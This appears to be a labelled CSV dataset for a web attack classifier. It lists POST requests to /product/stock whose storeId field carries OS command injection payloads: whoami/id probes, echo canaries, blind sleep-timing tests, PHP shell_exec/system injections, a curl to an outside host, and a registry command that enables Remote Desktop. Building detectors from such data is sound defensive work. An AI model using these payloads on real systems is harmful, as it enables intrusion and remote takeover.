method,path,body,dashes,andsign,dolar,orsign,lessthan,greaterthan,exclamation,badwords,class
POST,/product/stock,"productId=2&storeId=1 '
echo SXQQOX$((93+26))$(echo SXQQOX)SXQQOX""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo GRWCHE$((81+54))$(echo GRWCHE)GRWCHE//,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "" echo VSICUH$((78+75))$(echo VSICUH)VSICUH|",0,0,2,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 | [ 6 -ne $(echo MRDZPJ | tr -d '\n' | wc -c) ] || sleep 1 """,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ;echo FGXIGR$((59+62))$(echo FGXIGR)FGXIGR//,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ${shell_exec(print(`echo EDDLOS;echo $((48+73));echo EDDLOS;echo EDDLOS`);//EDDLOS,0,0,2,0,0,0,0,6,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1  echo VDKKTU$((48+39))$(echo VDKKTU)VDKKTU',0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSXQTVXE$((32+91))$(echo$IFSXQTVXE)XQTVXE//,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ; system('sleep 5');,0,0,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 | perl -e 'print ""X""x16096'",0,0,0,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""; str=$(echo NBAQGO); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi |",0,0,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo LOCFPZ)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi //",0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 "";echo YKMMSL$((26+29))$(echo YKMMSL)YKMMSL|",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ifconfig,0,0,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '|echo$IFSQSZPWD$((73+91))$(echo$IFSQSZPWD)QSZPWD&,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 )print(`echo NLOFKT\necho $((26+86))\necho NLOFKT\necho NLOFKT`);%25255C%25255CNLOFKT,0,0,1,0,0,0,0,8,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo FXYIAP$((22+40))$(echo FXYIAP)FXYIAP\\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSHKWBBD$((73+37))$(echo$IFSHKWBBD)HKWBBD,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ' echo QIIZIS$((83+28))$(echo QIIZIS)QIIZIS\\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1  echo RTIRFH$((5+80))$(echo RTIRFH)RTIRFH',0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '||echo$IFSAEDQZA$((27+88))$(echo$IFSAEDQZA)AEDQZA&,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1  echo GAZVPT$((45+89))$(echo GAZVPT)GAZVPT&,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo HLDNYH); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi &,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | dir,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ')print(`echo JUEAPR
echo $((30+6))
echo JUEAPR
echo JUEAPR`);.%2522JUEAPR",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 \n/usr/bin/id\n,0,0,0,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ||echo$IFSLSGARN$((66+92))$(echo$IFSLSGARN)LSGARN""",0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo ITSQLY$((14+91))$(echo ITSQLY)ITSQLY&,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 a;id;,0,0,0,0,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""echo$IFSEBQHZC$((54+58))$(echo$IFSEBQHZC)EBQHZC\\",0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ')print(`echo VPYMWX
echo $((10+22))
echo VPYMWX
echo VPYMWX`);%255C%255CVPYMWX",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo SLSODI$((22+77))$(echo SLSODI)SLSODI',0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ${system(print(`echo CKLWBH
echo $((38+7))
echo CKLWBH
echo CKLWBH`);.%2522CKLWBH",0,0,2,0,0,0,0,6,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo ICRCGR) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 %22",0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 echo VWXGBL$((23+33))$(echo VWXGBL)VWXGBL//,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSSUJVLB$((59+86))$(echo$IFSSUJVLB)SUJVLB|,0,1,4,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo BGUGCF)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %2F%2F",0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo LZSVGK)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 a);id,0,0,0,0,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo PSDLXW)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi |",0,0,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSKZMAVH$((10+87))$(echo$IFSKZMAVH)KZMAVH,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 $(`type C:\boot.ini`),0,0,1,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 )print(`echo EZVLWV\necho $((40+27))\necho EZVLWV\necho EZVLWV`);.%252527EZVLWV,0,0,1,0,0,0,0,8,bad
POST,/product/stock,"productId=2&storeId=1 ""echo UEUAGM$((11+22))$(echo UEUAGM)UEUAGM""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ${popen(print(`echo SLXBWN
echo $((29+57))
echo SLXBWN
echo SLXBWN`);%2529%257DSLXBWN",0,0,2,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSCKYHAJ$((39+53))$(echo$IFSCKYHAJ)CKYHAJ|,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '&&echo$IFSARLFCX$((76+3))$(echo$IFSARLFCX)ARLFCX//,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSJQGTZT$((74+60))$(echo$IFSJQGTZT)JQGTZT,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1  echo FKCLCN$((17+95))$(echo FKCLCN)FKCLCN//,0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ; str=$(echo POEKQX); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi """,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '; str=$(echo RCYHEM); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi """,0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo$IFSYDFXUN$((70+11))$(echo$IFSYDFXUN)YDFXUN",0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSKNHRIG$((80+9))$(echo$IFSKNHRIG)KNHRIG,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 &,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '||echo DJIUPG$((86+80))$(echo DJIUPG)DJIUPG&,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ')print(`echo WUCPEY
echo $((63+16))
echo WUCPEY
echo WUCPEY`);%2523WUCPEY",0,0,1,0,0,0,0,5,bad
POST,/product/stock,"productId=2&storeId=1 print(`echo DBCNNO
echo $((39+97))
echo DBCNNO
echo DBCNNO`);.%2522DBCNNO",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 &&echo FEYLRM$((81+59))$(echo FEYLRM)FEYLRM',0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 echo NXXMYC$((83+4))$(echo NXXMYC)NXXMYC\\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSDWCZMD$((39+76))$(echo$IFSDWCZMD)DWCZMD|,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo IHGKBJ)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %5C%5C",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSTRGLMB$((67+67))$(echo$IFSTRGLMB)TRGLMB//,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSTGBJOB$((42+77))$(echo$IFSTGBJOB)TGBJOB&,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
echo$IFSWVTSGH$((63+36))$(echo$IFSWVTSGH)WVTSGH""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '&echo$IFSCHNLIU$((42+39))$(echo$IFSCHNLIU)CHNLIU&,0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo QAFEAV$((75+66))$(echo QAFEAV)QAFEAV\\",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ';echo$IFSOGZZLG$((82+8))$(echo$IFSOGZZLG)OGZZLG\\,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSROVZMD$((87+57))$(echo$IFSROVZMD)ROVZMD\\,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo QCTOMN$((80+24))$(echo QCTOMN)QCTOMN&,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo VGHMVB); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ';echo LIHHVF$((18+45))$(echo LIHHVF)LIHHVF//,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1  echo ZRVFNO$((8+89))$(echo ZRVFNO)ZRVFNO\\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo MUQJWT$((7+78))$(echo MUQJWT)MUQJWT,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo JRNAMJ$((68+44))$(echo JRNAMJ)JRNAMJ\\,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo NWAYIZ) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 \\",0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1  echo MUBTOH$((84+39))$(echo MUBTOH)MUBTOH|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ${exec(print(`echo QRLVMM\necho $((41+19))\necho QRLVMM\necho QRLVMM`);%25255C%25255CQRLVMM,0,0,2,0,0,0,0,9,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 &&echo VEBSDL$((18+99))$(echo VEBSDL)VEBSDL""",0,1,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo$IFSGVEIAO$((60+74))$(echo$IFSGVEIAO)GVEIAO|",0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo DPBAVN)
 str1=${#str}
 if [ 9 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi '",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1  echo KRHFKC$((96+42))$(echo KRHFKC)KRHFKC//,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ' echo SZQVUT$((92+45))$(echo SZQVUT)SZQVUT""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo YCSCIW)
 str1=${#str}
 if [ 6 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi //",0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ${passthru(print(`echo KXVPHA
echo $((20+43))
echo KXVPHA
echo KXVPHA`);%255C%255CKXVPHA",0,0,2,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 '| [ 7 -ne $(echo ZATMDT | tr -d '\n' | wc -c) ] || sleep 1 %22,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ; curl https://crowdshield.com/.testing/rce_vuln.txt,0,0,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '&echo$IFSQKZYPP$((55+27))$(echo$IFSQKZYPP)QKZYPP',0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo GHEHAJ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi %7C,0,0,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 ||echo QUULXG$((42+65))$(echo QUULXG)QUULXG|,0,0,2,3,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 'print(`echo STJAIG
echo $((89+81))
echo STJAIG
echo STJAIG`);//STJAIG",0,0,1,0,0,0,0,5,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo$IFSVXVEBJ$((90+87))$(echo$IFSVXVEBJ)VXVEBJ'",0,0,4,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "";echo$IFSHZZDKE$((23+65))$(echo$IFSHZZDKE)HZZDKE&",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | [ 2 -ne $(echo SQHKCG | tr -d '\n' | wc -c) ] || sleep 1 &,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSCFKMSQ$((61+81))$(echo$IFSCFKMSQ)CFKMSQ//,0,1,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 & reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",0,0,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo LVVACM) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 //,0,4,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo VYCNRP)
 str1=${#str}
 if [ 3 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi """,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 '|echo$IFSGCIZYI$((9+92))$(echo$IFSGCIZYI)GCIZYI&,0,0,4,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 &&echo NDMYPS$((48+41))$(echo NDMYPS)NDMYPS""",0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSKDHDGC$((60+80))$(echo$IFSKDHDGC)KDHDGC\,0,0,4,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ;echo KTEBYS$((87+50))$(echo KTEBYS)KTEBYS""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSIWAFLA$((17+83))$(echo$IFSIWAFLA)IWAFLA//,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo ZYJHAC) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 #,0,4,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ';echo$IFSFQQLKE$((2+42))$(echo$IFSFQQLKE)FQQLKE""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ;echo UKUZES$((38+87))$(echo UKUZES)UKUZES|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo BKDTSI$((78+91))$(echo BKDTSI)BKDTSI&,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo QOFXCY)
 str1=${#str}
 if [ 6 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %26",0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo PAACLD)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %27",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
